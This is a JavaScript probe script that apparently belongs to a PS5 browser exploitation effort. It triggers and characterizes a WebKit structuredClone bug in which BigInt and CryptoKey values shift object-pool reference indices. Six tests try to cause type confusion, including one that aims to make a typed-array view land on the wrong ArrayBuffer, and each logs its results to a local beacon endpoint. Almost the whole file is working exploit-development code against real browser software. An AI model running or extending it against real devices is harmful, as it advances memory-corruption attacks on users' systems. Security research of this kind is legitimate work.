// p418 - structuredClone object pool mismatch via BigInt
//
// WK-1200 bug: BigInt primitives are added to the deserializer's m_gcBuffer
// but NOT to the serializer's m_objectPool. This shifts ObjectReferenceTag
// indices, causing type confusion in the deserialized object graph.
//
// WK-1400 fix: canBeAddedToObjectPool() whitelist + renamed m_gcBuffer to m_objectPool
//
// This probe verifies the mismatch exists on PS5 14.20 and characterizes the confusion.
//
// Beacon prefix: V418-

(function() {
  var BQ = 0;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V418-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send(body || '');
    } catch(e) {}
  }

  B('BOOT');

  // Check BigInt support
  try {
    var test = 42n;
    B('BIGINT-OK');
  } catch(e) {
    B('NO-BIGINT');
    B('COMPLETE');
    return;
  }

  // Check structuredClone support
  if (typeof structuredClone === 'undefined') {
    B('NO-STRUCTUREDCLONE');
    B('COMPLETE');
    return;
  }
  B('SC-OK');

  var idx = 0;
  var tests = [];

  function runNext() {
    if (idx < tests.length) {
      var t = tests[idx++];
      try { t(); }
      catch(e) { B('T' + idx + '-ERR-' + String(e).substring(0, 80)); setTimeout(runNext, 100); }
    } else {
      B('COMPLETE');
    }
  }

  // T1: Basic pool mismatch test
  // If BigInt shifts the pool, obj2 reference will resolve to BigInt
  tests.push(function() {
    B('T1-START');

    var obj1 = { marker: 'obj1' };
    var obj2 = { marker: 'obj2' };

    var data = {
      a: obj1,       // pool[1] = obj1
      b: 42n,        // BigInt NOT in pool, but m_gcBuffer[2] = BigInt
      c: obj2,       // pool[2] = obj2, but m_gcBuffer[3] = obj2
      d: obj2        // ObjectReferenceTag(2) -> should be obj2
    };

    var result = structuredClone(data);

    // Check if d === c (same object reference)
    var dIsC = (result.d === result.c);
    B('T1-D-IS-C-' + dIsC);

    // Check types
    B('T1-D-TYPE-' + typeof result.d);
    B('T1-C-TYPE-' + typeof result.c);

    // If mismatch: result.d would be BigInt(42n) instead of result.c
    if (typeof result.d === 'bigint') {
      B('T1-MISMATCH-CONFIRMED');
      B('T1-D-VAL-' + String(result.d));
    } else if (typeof result.d === 'object' && result.d !== null) {
      B('T1-D-MARKER-' + (result.d.marker || 'none'));
    }

    setTimeout(runNext, 100);
  });

  // T2: Double BigInt shift
  tests.push(function() {
    B('T2-START');

    var obj1 = { m: 'o1' };
    var obj2 = { m: 'o2' };
    var obj3 = { m: 'o3' };

    var data = {
      a: obj1,       // pool[1]
      b: 42n,        // BigInt extra
      c: 43n,        // BigInt extra
      d: obj2,       // pool[2]
      e: obj3,       // pool[3]
      f: obj2,       // ObjectReferenceTag(2) -> shifted by 2 to m_gcBuffer[4] = obj3??
      g: obj3        // ObjectReferenceTag(3) -> shifted by 2
    };

    var result = structuredClone(data);

    B('T2-F-IS-D-' + (result.f === result.d));
    B('T2-F-TYPE-' + typeof result.f);
    B('T2-G-IS-E-' + (result.g === result.e));
    B('T2-G-TYPE-' + typeof result.g);

    if (typeof result.f === 'bigint') {
      B('T2-F-BIGINT-' + String(result.f));
    } else if (result.f && typeof result.f === 'object') {
      B('T2-F-MARKER-' + (result.f.m || 'none'));
    }

    if (typeof result.g === 'bigint') {
      B('T2-G-BIGINT-' + String(result.g));
    } else if (result.g && typeof result.g === 'object') {
      B('T2-G-MARKER-' + (result.g.m || 'none'));
    }

    setTimeout(runNext, 100);
  });

  // T3: ArrayBuffer confusion attempt
  // Can we make a TypedArray reference the wrong ArrayBuffer?
  tests.push(function() {
    B('T3-START');

    var ab1 = new ArrayBuffer(16);    // Small
    var ab2 = new ArrayBuffer(4096);  // Large
    new Uint8Array(ab1).fill(0xAA);
    new Uint8Array(ab2).fill(0xBB);

    var view = new Uint8Array(ab2, 0, 4096); // View on large buffer

    var data = {
      a: ab1,        // pool[1] = ab1
      b: 42n,        // BigInt shift
      c: ab2,        // pool[2] = ab2 (shifted to m_gcBuffer[3])
      d: view        // view backed by ab2, writes ObjectReferenceTag(2) for buffer
    };

    try {
      var result = structuredClone(data);
      B('T3-CLONE-OK');

      // If mismatch: view's backing buffer ref(2) -> BigInt, type check fails
      // structuredClone should either fail or produce null view
      if (result.d === null || result.d === undefined) {
        B('T3-VIEW-NULL');
      } else {
        B('T3-VIEW-TYPE-' + Object.prototype.toString.call(result.d));
        B('T3-VIEW-LEN-' + result.d.length);
        B('T3-VIEW-BYTE0-' + result.d[0]);
        // Check if view is on ab1 (wrong buffer) or ab2 (correct)
        if (result.d.length === 4096) {
          B('T3-CORRECT-BUFFER');
        } else if (result.d.length === 16) {
          B('T3-WRONG-BUFFER-AB1');
        }
      }
    } catch(e) {
      B('T3-CLONE-ERR-' + e.name + '-' + e.message.substring(0, 60));
    }

    setTimeout(runNext, 100);
  });

  // T4: Reversed order - view before BigInt
  tests.push(function() {
    B('T4-START');

    var ab1 = new ArrayBuffer(16);
    var ab2 = new ArrayBuffer(4096);
    new Uint8Array(ab1).fill(0xCC);
    new Uint8Array(ab2).fill(0xDD);

    var view = new Uint8Array(ab2, 0, 4096);

    // Put BigInt AFTER both buffers
    var data = {
      a: ab2,        // pool[1] = ab2 (before BigInt)
      b: view,       // view backed by ab2, ObjectReferenceTag(1) for buffer
      c: 42n,        // BigInt shift (after the important references)
      d: ab1,        // pool[2] = ab1
      e: ab1         // ObjectReferenceTag(2) -> shifted to BigInt
    };

    try {
      var result = structuredClone(data);
      B('T4-CLONE-OK');

      // View should be correct (buffer ref before BigInt)
      if (result.b) {
        B('T4-VIEW-LEN-' + result.b.length);
        B('T4-VIEW-BYTE0-' + result.b[0]);
      }

      // e should be confused (ref after BigInt)
      B('T4-E-TYPE-' + typeof result.e);
      if (typeof result.e === 'bigint') {
        B('T4-E-MISMATCH');
      }
    } catch(e) {
      B('T4-CLONE-ERR-' + e.name + '-' + e.message.substring(0, 60));
    }

    setTimeout(runNext, 100);
  });

  // T5: CryptoKey mismatch test
  tests.push(function() {
    B('T5-START');

    if (typeof crypto === 'undefined' || !crypto.subtle) {
      B('T5-NO-SUBTLE');
      setTimeout(runNext, 100);
      return;
    }

    crypto.subtle.generateKey(
      { name: 'AES-GCM', length: 256 },
      true,
      ['encrypt', 'decrypt']
    ).then(function(key) {
      B('T5-KEY-OK');

      var obj1 = { m: 'k1' };
      var obj2 = { m: 'k2' };

      var data = {
        a: obj1,     // pool[1]
        b: key,      // CryptoKey NOT in pool, m_gcBuffer extra
        c: obj2,     // pool[2]
        d: obj2      // ObjectReferenceTag(2) -> should be obj2
      };

      try {
        var result = structuredClone(data);
        B('T5-CLONE-OK');

        B('T5-D-IS-C-' + (result.d === result.c));
        B('T5-D-TYPE-' + typeof result.d);

        if (result.d && result.d.type) {
          B('T5-D-IS-CRYPTOKEY');
        } else if (result.d && result.d.m) {
          B('T5-D-MARKER-' + result.d.m);
        }
      } catch(e) {
        B('T5-CLONE-ERR-' + e.name + '-' + e.message.substring(0, 60));
      }

      setTimeout(runNext, 100);
    }).catch(function(e) {
      B('T5-KEYGEN-ERR-' + e.message.substring(0, 60));
      setTimeout(runNext, 100);
    });
  });

  // T6: Multiple BigInts with large shift
  tests.push(function() {
    B('T6-START');

    var objs = [];
    for (var i = 0; i < 10; i++) {
      objs.push({ idx: i });
    }

    // Build object with 5 BigInts interleaved with 10 objects
    var data = {
      o0: objs[0],   // pool[1]
      o1: objs[1],   // pool[2]
      n0: 100n,      // BigInt shift 1
      o2: objs[2],   // pool[3]
      o3: objs[3],   // pool[4]
      n1: 200n,      // BigInt shift 2
      n2: 300n,      // BigInt shift 3
      o4: objs[4],   // pool[5]
      o5: objs[5],   // pool[6]
      n3: 400n,      // BigInt shift 4
      o6: objs[6],   // pool[7]

      // References to objects after various BigInts
      r3: objs[3],   // pool[4] -> should be objs[3], shifted by 1
      r5: objs[5],   // pool[6] -> should be objs[5], shifted by 3
      r6: objs[6],   // pool[7] -> should be objs[6], shifted by 4
    };

    try {
      var result = structuredClone(data);
      B('T6-CLONE-OK');

      // Check each reference
      B('T6-R3-IS-O3-' + (result.r3 === result.o3));
      B('T6-R3-TYPE-' + typeof result.r3);
      if (result.r3 && typeof result.r3 === 'object') {
        B('T6-R3-IDX-' + result.r3.idx);
      } else if (typeof result.r3 === 'bigint') {
        B('T6-R3-BIGINT-' + String(result.r3));
      }

      B('T6-R5-IS-O5-' + (result.r5 === result.o5));
      B('T6-R5-TYPE-' + typeof result.r5);
      if (result.r5 && typeof result.r5 === 'object') {
        B('T6-R5-IDX-' + result.r5.idx);
      } else if (typeof result.r5 === 'bigint') {
        B('T6-R5-BIGINT-' + String(result.r5));
      }

      B('T6-R6-IS-O6-' + (result.r6 === result.o6));
      B('T6-R6-TYPE-' + typeof result.r6);
      if (result.r6 && typeof result.r6 === 'object') {
        B('T6-R6-IDX-' + result.r6.idx);
      } else if (typeof result.r6 === 'bigint') {
        B('T6-R6-BIGINT-' + String(result.r6));
      }
    } catch(e) {
      B('T6-ERR-' + e.message.substring(0, 60));
    }

    setTimeout(runNext, 100);
  });

  runNext();
})();
